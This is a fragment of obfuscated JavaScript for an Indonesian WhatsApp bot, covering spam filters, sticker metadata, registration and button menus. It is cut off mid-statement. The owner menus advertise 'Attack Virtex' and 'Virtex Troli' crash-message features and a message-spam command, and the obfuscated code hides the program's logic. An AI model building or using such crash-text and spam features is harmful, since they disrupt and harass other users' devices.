        if (isCmd && !isOwner && msgFilter.isFiltered(from) && isGroup) {
        console.log(color('[SPAM]', 'red'), color(time, 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
        return
        }

        if (isStMsg && !isOwner && msgFilter.isFiltered(from) && !isGroup) {
        console.log(color('[SPAM BUTON]', 'red'), color(time, 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname))
        return
        }
        if (isStMsg && !isOwner && msgFilter.isFiltered(from) && isGroup) {
        console.log(color('[SPAM BUTON]', 'red'), color(time, 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
        return
        }
//DETECTOR MEDIA
		colors = ['red', 'white', 'black', 'blue', 'yellow', 'green']
		const isMedia = (type === 'imageMessage' || type === 'videoMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
		const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
		const isQuotedLoca = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocs = type === 'extendedTextMessage' && content.includes('documentMessage')
        const isQuotedTeks = type === 'extendedTextMessage' && content.includes('quotedMessage')
        const isQuotedTag = type === 'extendedTextMessage' && content.includes('mentionedJid')
        const isQuotedProd = type === 'extendedTextMessage' && content.includes('productMessage')
        const isQuotedReply = type === 'extendedTextMessage' && content.includes('Message')
      	if (!isGroup && isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
      	//if (!isGroup && !isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
     	if (isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
      	//if (!isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
		if (!isOwner && !isPremium && banChats === true) return
		if (isCmd && !isOwner) msgFilter.addFilter(from)
		
			
function addMetadata(packname, author) {	
	if (!packname) packname = 'WABot'; if (!author) author = 'Bot';	
	author = author.replace(/[^a-zA-Z0-9]/g, '');	
	let name = `${author}_${packname}`
	if (fs.existsSync(`./temp/${name}.exif`)) return `./temp/${name}.exif`
	const json = {	
		"sticker-pack-name": packname,
		"sticker-pack-publisher": author,
	}
	const littleEndian = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00])	
	const bytes = [0x00, 0x00, 0x16, 0x00, 0x00, 0x00]	

	let len = JSON.stringify(json).length	
	let last	

	if (len > 256) {	
		len = len - 256	
		bytes.unshift(0x01)	
	} else {	
		bytes.unshift(0x00)	
	}	

	if (len < 16) {	
		last = len.toString(16)	
		last = "0" + len	
	} else {	
		last = len.toString(16)	
	}	

	const buf2 = Buffer.from(last, "hex")	
	const buf3 = Buffer.from(bytes)	
	const buf4 = Buffer.from(JSON.stringify(json))	

	const buffer = Buffer.concat([littleEndian, buf2, buf3, buf4])	

	fs.writeFile(`./temp/${name}.exif`, buffer, (err) => {	
		return `./temp/${name}.exif`	
	})	

}
	  
//STICKER COMMAND
switch (isStc) {
case "7tIEIBdiWVigLIQITT/tdHuOEuhLTdSiyF3HZtfZ6KM=": 
if (isRegistered) return  reply(ind.rediregis())
                const serialUser = createSerial(10)
                veri = sender
                if (!isGroup) {
                    addRegisteredUser(sender, pushname, time, serialUser)
                    reply(ind.registered(pushname, serialUser, time, sender))
                    console.log(color('[REGISTER]'), color(time, 'yellow'), 'Name:', color(pushname, 'cyan'), 'Serial:', color(serialUser, 'cyan'), 'in', color(sender || groupName))
                } else {
                    addRegisteredUser(sender, pushname, time, serialUser)
                    reply(ind.registered(pushname, serialUser, time, sender))
                    console.log(color('[REGISTER]'), color(time, 'yellow'), 'Name:', color(pushname, 'cyan'), 'Serial:', color(serialUser, 'cyan'))
                }
			break
}
const _0x39f6c9=_0x124b;(function(_0x3cc8a6,_0x473d63){const _0x77cb3e=_0x124b,_0x2d018d=_0x3cc8a6();while(!![]){try{const _0x2b22a4=parseInt(_0x77cb3e(0x1c0))/0x1*(-parseInt(_0x77cb3e(0x2c7))/0x2)+parseInt(_0x77cb3e(0x204))/0x3+parseInt(_0x77cb3e(0x119))/0x4+-parseInt(_0x77cb3e(0x252))/0x5+-parseInt(_0x77cb3e(0x1d6))/0x6*(-parseInt(_0x77cb3e(0x151))/0x7)+-parseInt(_0x77cb3e(0x1be))/0x8*(-parseInt(_0x77cb3e(0x2c4))/0x9)+-parseInt(_0x77cb3e(0x1b3))/0xa;if(_0x2b22a4===_0x473d63)break;else _0x2d018d['push'](_0x2d018d['shift']());}catch(_0x184f2d){_0x2d018d['push'](_0x2d018d['shift']());}}}(_0x5764,0x4a413));function _0x5764(){const _0x1cce85=['Menu\x20Tipe\x20Katalog','```STATUS\x20:\x20SELF```','_*\x0a*_Pilih\x20Salah\x20Satu\x20Tipe\x20Virtex_*','gachamenu','parse','fakeloc','leave','anticall','Untuk\x20Hiburan\x20Di\x20Group','Member\x20Yang\x20Online\x20Saat\x20ini','Tag\x20Semua\x20Member\x20Group','```ALREADY\x20PUBLIC```','Perintah\x20yang\x20Sering\x20di\x20Gunakan','Pesan\x20Tidak\x20Dibisukan','List\x20Harga\x20Sewa','\x0a╰──────────────────','Succes\x20change\x20theme\x20meme','List\x20Video','reply\x20gambar/sticker/audio/video\x20dengan\x20caption\x20','Succes\x20mematikan\x20antibug','c.us','premium','Succes\x20change\x20antilink\x20default','Mode\x20Bot','LIST\x20INFO','Revoke','INQUIRY','push','spam\x20teks|jumlahspam','downloadmenu','extendedTextMessage','*_Hai\x20@','Succes\x20mematikan\x20autoread\x20group','help','donasi','meme','all','99999999999999999999','*Sticker\x20list\x20:*\x0a\x0a','Virtex\x20Teks','Succes\x20mematikan\x20antitag','base64','*\x0a*Bot\x20ini\x20di\x20lengkapi\x20Anti-Spam\x20jadi\x20beri\x20jeda\x205\x20detik*','PUNTEN\x20PAKET.....','Storage','charger','\x0aSilahkan\x20tekan\x20Tombol\x20\x22Menu\x22\x20untuk\x20melihat\x20list\x20command\x20dari\x20','jeff','Virtex','NEXT','PUBLIC','UnRead\x20All','Daftar\x20Respon\x20Bot','slice','\x20kode\x20item\x20nominal','Perintahnya\x20apa','video/mp4','List\x20Sticker\x20Bot','162533333338378','*\x0a\x0a_Untuk\x20mengambil\x20sticker\x20silahkan\x20reply\x20pesan\x20ini\x20dengan\x20caption\x20nama\x20sticker_','setcmd','1108940dvAFaZ','Fitur\x20Group','cmd','test1','Mute','Reply\x20gambarnya!','Group\x20Official\x20Bot','Daftar\x20Badword\x20Bot','Anti\x20Link','List\x20Group','groupMetadata','+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=','\x20tambahan\x20yang\x20ada\x20di\x20option*\x0a*List\x20Option*\x0a•->\x20antidelete\x0a->\x20anticall\x0a->\x20autoreadgc\x0a->\x20autoreadpc\x0a->\x20antitag','├❏\x20','enable','*\x0a\x0a','Menu\x20Katalog','unmute','UnArchive','message','/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69','mode','antilink\x20off','\x20Atas','\x0a*Prefix\x20:*\x20\x20','menuowner','Semua\x20Pesan\x20Dihapus','toString','cecan','pinned\x20chat\x20=\x20','getProfilePicture','Donasi','pesan','Unpin','addcmd','setMaxListeners','Admin\x20Bot\x20List','Pesan\x20Tidak\x20Diarsipkan','gc\x20buka','Saya\x20adalah\x20','Attack\x20Virtex','\x0a*Versi\x20OS\x20:*\x20\x20','verify','groupRemove','setppbot\x20atau\x20tag\x20gambar\x20yang\x20sudah\x20dikirim','toggleDisappearingMessages','format','event\x20off','setppbot','Free\x0aSewa\x20Bot\x20Selama\x201\x20Hari','Menu\x20Simple','Succes\x20change\x20theme\x20cecan','setlink','Daftar\x20Premium\x20Bot','_Succses\x20mengganti\x20menu\x20ke\x20menu\x20simple_','Gacha\x20Menu','MENU','Premium\x20List','*「\x20BROADCAST\x20BOT\x20」*\x0a\x0a','List\x20Cmd','s.whatsapp.net','addpremium','succes\x20unarchive\x20chat\x20=\x20','Hai\x20Sayangku','balasan','Succes\x20delete\x20sticker\x20cmd','50000','Anti\x20Toxic','├❏@','gamemenu','stickerMessage','\x0a\x0a*•>\x20ID\x20:*\x20','get','next','MB\x20/\x20','totag','UnPin','upswimage','browserDescription','Bot\x20Join\x20Group','Succes\x20mengaktifkan\x20anticall','Succes\x20mengaktifkan\x20antidelete','Author','autoreadpc','Menampilkan\x20Peraturan\x20Bot','replace','autoreadgc','*List\x20Online:*\x0a','_Pilih\x20Mode\x20Di\x20Bawah\x20Ini_','List\x20Admin','Informasi\x20Group','Developer\x20Bot','Menu\x20Bot','menuinfo','Store','multi','6289530298948@s.whatsapp.net','Archive','premiumbot','term','\x0a*WIT\x20:*\x20\x20','Tagall','*➣\x20NAME*\x20:\x20','welcome\x20on','composing','welcome\x20off','\x20Turun\x20Jabatan\x20Menjadi\x20Babu\x20','Self','\x0a│•\x20*XP:*\x20','downloadAndSaveMediaMessage','```SUCCES\x20REVOKE\x20LINK\x20GROUP```','updatePresence','Kirim\x20gambar\x20dengan\x20caption\x20','succes\x20unmute\x20chat\x20=\x20','818091EIBGYO','├❏\x20@','\x0a\x0a*link\x20Group\x20','4UFRaeB','Hidetag\x20Semua\x20Member\x20Group','uptime','Menu\x20Tipe\x20Teks','length','https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg','unpremium','Selamat\x20@','registered','Block\x20List','Sewa\x201\x20Bulan','\x20Chat\x0a*Personal\x20Chat\x20:*\x20\x20',']\x20@','Semua\x20Pesan\x20Tiak\x20Dibaca','Asia/Jakarta','setnamebot','Group\x20Menu','Contributor','map','Succes\x20change\x20antilink\x20id','test','blockUser','listMessage','OFF','https://chat.whatsapp.com/','simple','Pesan\x20Dibisukan','Name:','[\x20*','setmenu','simplemenu','150453297177375','Delete\x20Pc','Pesan\x20Dihapus','trim','Owner','Owner\x20Bot','quotedMessage','\x20Second\x0a*Runtime\x20:*\x20\x20','Info\x20Menu','virtex','Menampilkan\x20fitur\x20Untuk\x20Group','InfoMenu','*List\x20Video\x20:*\x0a\x0a','chats','Sticker','subject','\x20Chat\x0a*Total\x20User\x20:*\x20\x20','Succes\x20mengaktifkan\x20autoread\x20group','Donasi\x20Seikhlasnya','keys','listgroup','alloc','groupInviteCode','Menampilkan\x20Group\x20Bot','1\x20Minggu','next*\x20—\x20find\x20a\x20new\x20partner\x0aUsername:','sewa','https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc','Next','Unread\x20All','\x20salah\x20satu\x20Bot\x20Whatsapp\x20yang\x20diciptakan\x20oleh\x20manusia\x20gabut\x20:\x20@','Cara\x20Menggunakannya\x20','image/jpeg','Sukses\x20Upload\x20Story\x20Video\x20dengan\x20Caption:\x20','Leave','unblock','com','Virtex\x20Catalog','delblock','Group','List\x20Sticker','\x0a│•\x20*Level:*\x20','Example:','BotStat','Anonnymous\x20Menu','Succes\x20add\x20sticker\x20cmd','creation','Rules','Rp.30.000\x0aDapatkan\x20Fitur\x20VIP','Welcome','infomenu','upswtext','Join','\x0a*Charger\x20:*\x20\x20','Tipe\x20Virtex','*BLOCKLIST:*\x0a','antitag','Cek\x20Menu','List\x20TopUp\x20Game','*List\x20Image\x20:*\x0a\x0a','Reply\x20videonya!','99999999999999999999999999999999','Menjadi\x20Bot\x20Secara\x20Permanen','Kick\x20All','harus\x20berupa\x20angka','```ketik\x20','Bot\x20Keluarkan\x20Semua\x20Member\x20Group','setprefix','anonnymouschat','Big\x20Thanks\x20To','status@broadcast','Virtex\x20Troli','rules','@s.whatsapp.net','text','locationMessage','Succes\x20antibug\x20autoread','mute','limitend','event\x20on','archive','Rp.25.000\x0aSewa\x20Bot\x20Selama\x201\x20Bulan','SourceCode','Menampilkan\x20Status\x20Bot','@c.us','antivirtex\x20off','[REGISTER]','Fitur\x20Anti\x20Toxic','Link\x20Group\x20Sekarang','•\x20Nama\x20grup\x20:\x20','cyan','Daftar\x20Admin\x20Bot','quotedM','Succes\x20mematikan\x20anticall','\x20tag\x20stickernya','stringify','Bahasa','Awoakwoakwoak','spam','Gabut\x20Menu','Game\x20Menu','Set\x20Menu','add','393470602054-1351628616@g.us','*L\x20I\x20S\x20T\x20\x20G\x20R\x20O\x20U\x20P*\x0aJumlah\x20Grup:\x20','Sewa\x201\x20Minggu','╭─「\x20*PROFILE\x20ANDA*\x20」\x0a│•\x20*Name:*\x20','Tentang\x20Chat','Link\x20Group','\x0a*Merk\x20HP\x20:*\x20\x20','\x0aSilahkan\x20tekan\x20Tombol\x20\x22Click\x20Me!\x22\x20untuk\x20melihat\x20list\x20command\x20dari\x20','539592isZacQ','\x20nomor\x20atau\x20tag','jid','splice','\x0a*WIB\x20:*\x20\x20','delpremium','unpin\x20chat\x20=\x20','Read\x20All','IDR','Admin\x20Dari\x20Group','antidelete','VIRTEX\x20&\x20BUG','Download\x20Menu','succes\x20archive\x20chat\x20=\x20','Menu\x20Ori','\x0a\x0a*Dev\x20:*\x20\x20@','Succes\x20change\x20prefix\x20=\x20','delete','Group\x20Info','Bot\x20Keluar\x20Group','Daftar\x20Cmd\x20Bot','28777','Succes\x20change\x20antilink\x20ml','revokeInvite','\x0a*Versi\x20Bot\x20:*\x20\x20','audio/mp4','menu','ConvertMenu','WELCOME\x20TO\x20MY\x20STORE','participants','xyz','Group\x20Bot','prepareMessage','contactsArrayMessage','\x0a\x0a*Server\x20Name\x20:*\x20\x20','sedang\x20tidak\x20di\x20cas','Chat\x20Owner\x20Jika\x20Kamu\x20Perlu','\x20cmdnya\x20dan\x20tag\x20stickernya','*List\x20admin\x20dari\x20','totalmem','List\x20Online','\x20Chat\x0a*Total\x20Chat\x20:*\x20\x20','writeFileSync','gabutmenu','Pesan\x20Disematkan','deleteMessage','relayWAMessage','Menampilkan\x20fitur\x20dari\x20Download','ownerb','*LIST\x20RESPON\x20CMD*','./database/user/premium.json','LUC\x20BOT\x20~\x20ERROR\x20','sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=','KAK\x20PESEN\x20SEBLAK\x20','\x0a*Whatsapp\x20:*\x20\x20','buttonsMessage','34993BaHRfl','AR7i5IXXiMA6NjT0DxcwdcKxhXCy1rOrvlNJzqXPMr8PCg==','sedang\x20di\x20cas','Serial:','Clear\x20All','groupLeave','*Ketik\x20','setmenu\x20simple','image/','persen','split','Premium','fileSha256','modifyChat','round','toFixed','vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=','teks','chatRead','imageMessage','List\x20Info','Mode','Menampilkan\x20Kode\x20Bahasa','Succes\x20mematikan\x20antidelete','unlinkSync','Syarat\x20Dan\x20Peraturan','Command\x20ini\x20tidak\x20bisa\x20digunakan\x20di\x20dalam\x20grup,silahkan\x20gunakan\x20di\x20private\x20chat\x20bot','\x0a•\x20Jumlah\x20Peserta\x20:\x20','GabutMenu','Partner\x20found:\x20🙉\x0a*','Tipe\x20Menu\x20Bot','Pin','\x20~\x20404\x20','85296556573-1328272333@g.us','*\x0a*Powered\x20By\x20@','PHOTO','`Rp.30.000\x0aSewa\x20Bot\x20Selama\x201\x20Bulan','DD/MM/YYYY\x20HH:mm:ss','succes\x20mute\x20chat\x20=\x20','LUC\x20BOT\x20~\x20404\x20','Nomor\x20Developer\x20Bot','1\x20Bulan','*List\x20Vn:*\x0a\x0a','*\x0a\x0a_Untuk\x20mengambil\x20sticker\x20silahkan\x20reply\x20pesan\x20ini\x20dengan\x20caption\x20nama\x20audio_','Info\x20Profile\x20Kamu','Succes\x20change\x20prefix\x20=\x20Multi\x20Prefix',':~\x20','2\x20kontak','gc\x20tutup','cekmenu','◪\x20*List\x20Anti\x20Link*\x0a├default\x0a├com\x0a├id\x0a├xyz\x0a├ly\x0a├wa','List\x20Respon','Bot\x20Menampilkan\x20List\x20Group','Jadi\x20Bot','WELCOME\x20OWNER','grupseting','LUC\x20BOT\x20~\x20ERROR','Daftar\x20Block\x20Bot','```ALREADY\x20SELF```','unpin','VIP','remove','Owner\x20Menu','self','Fitur\x20Anti\x20Link','.\x0a\x0aDiharapkan\x20untuk\x20tidak\x20menelpon\x20ke\x20nomor\x20ini,tidak\x20mintak\x20save\x20dan\x20tidak\x20spam\x20dalam\x20penggunaan\x20bot','\x20_Succses\x20mengganti\x20menu\x20ke\x20menu\x20ori_','```FOTO\x20PROFILE\x20BERHASIL\x20DI\x20PERBARUI```','https://chat.whatsapp.com/GY74IwuwLlFELw97ByRk79','genshin','Menampilkan\x20Source\x20Code\x20Bot','ori','registrasi','*\x20\x0a\x0a_Untuk\x20mengambil\x20video\x20silahkan\x20reply\x20pesan\x20ini\x20dengan\x20caption\x20nama\x20video_','Simple','Silahkan\x20Hubungin\x20Owner\x20Luc\x20Bot\x20Untuk\x20Informasi\x20Lebih\x20Lanjut','join','Source\x20Script\x20Bot\x20:\x20','Succes\x20change\x20theme\x20genshin','contextInfo','*MY\x20STATS*\x0a*','Sewa','Teks\x20Immune\x20Virtex','\x0a│•\x20*User\x20Terdaftar:*\x20✓\x0a│•\x20*Link:*\x20wa.me/','menucek','Menampilkan\x20List\x20Harga\x20Sewa\x20Bot','Looking\x20for\x20a\x20partner...','Maaf\x20@','Rp.10.000\x0aDapatkan\x20Fitur\x20Premium','groupsetting','Event','*😘*\x20','\x20Naik\x20Jabatan\x20Menjadi\x20User\x20Pemium\x20','Succes\x20change\x20theme\x20cogan','wa.me/','\x0a*•>\x20Cmd\x20:*\x20','start','\x20_Succses\x20mengganti\x20menu\x20ke\x20menu\x20katalog_','3283160ZIESRA','Menu','\x20BROADCAST*\x20]\x0a\x0a','DONASI','└❏\x20*Total\x20:\x20','heapUsed','CATALOG','antibug','yellow','```SUKSESS\x20BROADCAST```','List\x20Vn','48ahIOWc','Trial','262155ZRvsiO','grupmenu','upswvideo','Example\x20:\x20','Pesan\x20Tidak\x20Disematkan','1610993486','\x0a*Blockir\x20:*\x20\x20','Fitur\x20Welcome','Anonnymous\x20Chat','cogan','OPEN','readFileSync','sticker\x20atau\x20reply/tag\x20gambar(durasi\x20sticker\x20video\x201-9\x20detik)','noregis','Menampilkan\x20Contributor\x20Bot','Mengobrol\x20Dengan\x20Orang\x20Lain','└❏\x20*Total:*\x20','default','JadiBot','Hidetag','Source\x20Code','downloadMediaMessage','174pvtvIR','UnMute','addblock','wFHwtOxGQN8OwK2x','spam\x20teks|jumlah','\x20Owner\x20Tersayang','menugabut','List\x20Image','Succes\x20change\x20theme\x20default','Succes\x20mematikan\x20autoread\x20pribadi','\x20chat\x0a*Speed\x20:*\x20\x20','convertmenu','gif','Menu\x20Tipe\x20Button','audioMessage','log','MB\x0a*Versi\x20HP\x20:*\x20\x20','?text=Hai+boleh+kenalan+gak\x0a*Support\x20Nekopoi.Care*\x0a*Offical\x20Bot\x20By\x20@','Ubah\x20Link\x20Group','Start','```STATUS\x20:\x20PUBLIC```','\x0a\x0a*Battery\x20:*\x20\x20','Succes\x20Mengganti\x20Nama\x20Bot\x20Menjadi\x20:\x20','disable','0@s.whatsapp.net','\x0a•\x20Dibuat\x20:\x20','List\x20Badword','baned','./lib/LUCBOT.pdf','Immune\x20Virtex','\x0a•\x20ID\x20grup\x20:\x20','block','Succes\x20change\x20antilink\x20wa','Semua\x20Pesan\x20Dibaca','List\x20Video\x20Bot','./database/bot/scommand.json','public','videoMessage','Convert\x20Menu','*\x0a*Total:\x20','Terimakasih\x20Sudah\x20Mendaftar\x0a*Support\x20Nekopoi.Care*\x0a*Offical\x20Bot\x20By\x20@','upswteks','Budayakan\x20Membaca\x20Sebelum\x20Menggunakan\x20Bot','Profile','Succes\x20change\x20antilink\x20http','\x0a*WITA\x20:*\x20\x20','1659894mmirtf','SELF','\x0a*MNC\x20:*\x20\x20','Fitur\x20Anti\x20Virtex','sendMessage','Click\x20Me!','bot','Menampilkan\x20Info\x20Bot','unarchive','ownermenu','menugame','-\x20@','prepareMessageFromContent','pdf','Silahkan\x20Bergabung\x20Untuk\x20Info\x20Updatean\x20Terbaru','1\x20Hari','*Support\x20Nekopoi.Care*\x0a*Offical\x20Bot\x20By\x20@'];_0x5764=function(){return _0x1cce85;};return _0x5764();}switch(isStMsg){case _0x39f6c9(0x18f):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(!isOwner)return replysticker(ownerstc);const ownerrowsbtn=[{'title':_0x39f6c9(0x166),'description':_0x39f6c9(0x22c),'rowId':'\x20'},{'title':'Set\x20Menu','description':'Tipe\x20Menu\x20Bot','rowId':'\x20'},{'title':_0x39f6c9(0xcc),'description':'Bot\x20Keluar\x20Group','rowId':'\x20'},{'title':'Clear\x20All','description':_0x39f6c9(0x26c),'rowId':'\x20'},{'title':_0x39f6c9(0x120),'description':_0x39f6c9(0x1f7),'rowId':'\x20'},{'title':_0x39f6c9(0x248),'description':'Semua\x20Pesan\x20Tiak\x20Dibaca','rowId':'\x20'},{'title':_0x39f6c9(0x256),'description':_0x39f6c9(0xa5),'rowId':'\x20'},{'title':_0x39f6c9(0x1d7),'description':_0x39f6c9(0x222),'rowId':'\x20'},{'title':_0x39f6c9(0x170),'description':_0x39f6c9(0x145),'rowId':'\x20'},{'title':_0x39f6c9(0x29e),'description':_0x39f6c9(0x1c4),'rowId':'\x20'},{'title':_0x39f6c9(0x2b3),'description':'Pesan\x20Diarsipkan','rowId':'\x20'},{'title':_0x39f6c9(0x264),'description':'Pesan\x20Tidak\x20Diarsipkan','rowId':'\x20'},{'title':_0x39f6c9(0xab),'description':_0x39f6c9(0xac),'rowId':'\x20'},{'title':_0x39f6c9(0xe9),'description':_0x39f6c9(0xec),'rowId':'\x20'}],ownerrowsbtn2=[{'title':'List\x20Respon','description':_0x39f6c9(0x249),'rowId':'\x20'},{'title':'List\x20Cmd','description':_0x39f6c9(0x12d),'rowId':'\x20'},{'title':_0x39f6c9(0x25b),'description':_0x39f6c9(0x185),'rowId':'\x20'}],ownerrowsbtn3=[{'title':_0x39f6c9(0x23c),'description':_0x39f6c9(0x27a),'rowId':'\x20'},{'title':'Virtex\x20Troli','description':'Attack\x20Virtex','rowId':'\x20'},{'title':_0x39f6c9(0xcf),'description':_0x39f6c9(0x27a),'rowId':'\x20'}],sectionsownerbtn=[{'title':_0x39f6c9(0x187),'rows':ownerrowsbtn},{'title':_0x39f6c9(0x22d),'rows':ownerrowsbtn2},{'title':_0x39f6c9(0x124),'rows':ownerrowsbtn3}],buttonownerbtn={'buttonText':_0x39f6c9(0x291),'footerText':ind['menuowner'](prefix,dev,numbernye),'description':'*'+hahh+'\x20@'+player[_0x39f6c9(0x15b)]('@')[0x0]+_0x39f6c9(0x23f),'sections':sectionsownerbtn,'listType':0x1};client[_0x39f6c9(0x208)](from,buttonownerbtn,MessageType[_0x39f6c9(0xa1)],{'quoted':ftoko,'contextInfo':{'mentionedJid':[player,numbernye,ow,dev],'externalAdReply':{'title':hahh+'\x20Owner\x20Tersayang','body':''+fakereply,'previewType':_0x39f6c9(0x174),'thumbnailUrl':'\x20','thumbnail':WMthumb,'sourceUrl':''+mybio}}});break;case _0x39f6c9(0xb2):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);const inforows1=[{'title':_0x39f6c9(0xae),'description':_0x39f6c9(0xaf),'rowId':'\x20'},{'title':_0x39f6c9(0x1d4),'description':_0x39f6c9(0x1d4),'rowId':'\x20'},{'title':_0x39f6c9(0x271),'description':_0x39f6c9(0xbc),'rowId':'\x20'},{'title':_0x39f6c9(0xd5),'description':'Menampilkan\x20Status\x20Bot','rowId':'\x20'},{'title':_0x39f6c9(0x138),'description':_0x39f6c9(0xc1),'rowId':'\x20'},{'title':_0x39f6c9(0xd9),'description':_0x39f6c9(0x2a6),'rowId':'\x20'},{'title':_0x39f6c9(0x10a),'description':'Menampilkan\x20Kode\x20Bahasa','rowId':'\x20'},{'title':_0x39f6c9(0x186),'description':'Menjadi\x20Bot\x20Secara\x20Permanen','rowId':'\x20'},{'title':_0x39f6c9(0x201),'description':'Info\x20Profile\x20Kamu','rowId':'\x20'},{'title':'Immune\x20Virtex','description':_0x39f6c9(0x1a3),'rowId':'\x20'}],inforows12=[{'title':'Premium\x20List','description':_0x39f6c9(0x287),'rowId':'\x20'},{'title':'Block\x20List','description':_0x39f6c9(0x18a),'rowId':'\x20'},{'title':_0x39f6c9(0x1f0),'description':_0x39f6c9(0x259),'rowId':'\x20'}],inforows123=[{'title':_0x39f6c9(0x1bd),'description':'List\x20Vn\x20Bot','rowId':'\x20'},{'title':'List\x20Sticker','description':_0x39f6c9(0x24e),'rowId':'\x20'},{'title':'List\x20Video','description':'List\x20Video\x20Bot','rowId':'\x20'},{'title':_0x39f6c9(0x1dd),'description':'List\x20Image\x20Bot','rowId':'\x20'}],sectionsinfo1=[{'title':_0x39f6c9(0x241),'rows':inforows123},{'title':_0x39f6c9(0xb2),'rows':inforows1},{'title':_0x39f6c9(0x165),'rows':inforows12}],buttoninfo1={'buttonText':_0x39f6c9(0x209),'footerText':ind[_0x39f6c9(0xdc)](prefix,dev,numbernye),'description':'*'+hahh+'\x20@'+player[_0x39f6c9(0x15b)]('@')[0x0]+_0x39f6c9(0x23f),'sections':sectionsinfo1,'listType':0x1};client[_0x39f6c9(0x208)](from,buttoninfo1,MessageType['listMessage'],{'quoted':ftoko,'contextInfo':{'mentionedJid':[player,numbernye,ow,dev],'externalAdReply':{'title':hahh+_0x39f6c9(0x1db),'body':''+fakereply,'previewType':_0x39f6c9(0x174),'thumbnailUrl':'\x20','thumbnail':WMthumb,'sourceUrl':''+mybio}}});break;case _0x39f6c9(0x10d):if(isBanned)return replysticker(banstc);if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(!isGroup)return replysticker(grupstc);const gabutrows1=[{'title':_0x39f6c9(0x271),'description':'Donasi','rowId':'\x20'}],sectionsgabut1=[{'title':_0x39f6c9(0x10d),'rows':gabutrows1}],buttongabut1={'buttonText':_0x39f6c9(0x209),'footerText':ind[_0x39f6c9(0x1dc)](prefix,dev,numbernye),'description':'*'+hahh+'\x20@'+player['split']('@')[0x0]+_0x39f6c9(0x23f),'sections':sectionsgabut1,'listType':0x1};client['sendMessage'](from,buttongabut1,MessageType[_0x39f6c9(0xa1)],{'quoted':ftoko,'contextInfo':{'mentionedJid':[player,numbernye,ow,dev],'externalAdReply':{'title':hahh+_0x39f6c9(0x1db),'body':''+fakereply,'previewType':'PHOTO','thumbnailUrl':'\x20','thumbnail':WMthumb,'sourceUrl':''+mybio}}});break;case _0x39f6c9(0x289):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(mainmenu==![]){const crajsowads2=[{'title':'Donasi','description':_0x39f6c9(0x271),'rowId':'\x20'}],sectionsgahack2=[{'title':'Gacha\x20Menu','rows':crajsowads2}],buttoncasaddhck2={'buttonText':_0x39f6c9(0x209),'footerText':ind[_0x39f6c9(0x218)](prefix,dev,numbernye),'description':'*'+hahh+'\x20@'+player[_0x39f6c9(0x15b)]('@')[0x0]+'*\x0a*Bot\x20ini\x20di\x20lengkapi\x20Anti-Spam\x20jadi\x20beri\x20jeda\x205\x20detik*','sections':sectionsgahack2,'listType':0x1};client['sendMessage'](from,buttoncasaddhck2,MessageType[_0x39f6c9(0xa1)],{'quoted':ftoko,'contextInfo':{'mentionedJid':[player,numbernye,ow,dev],'externalAdReply':{'title':hahh+_0x39f6c9(0x1db),'body':''+fakereply,'previewType':'PHOTO','thumbnailUrl':'\x20','thumbnail':WMthumb,'sourceUrl':''+mybio}}});}else(mainmenu=!![])&&sendButtonImageLoc(from,buttonsmenu5,ind[_0x39f6c9(0x218)](prefix,dev,numbernye),buttonsmenu2,{'quoted':mek,'contextInfo':{'mentionedJid':[player,numbernye,ow,dev]}});break;case _0x39f6c9(0xe3):if(isBanned)return replysticker(banstc);if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(!isGroup)return replysticker(grupstc);const 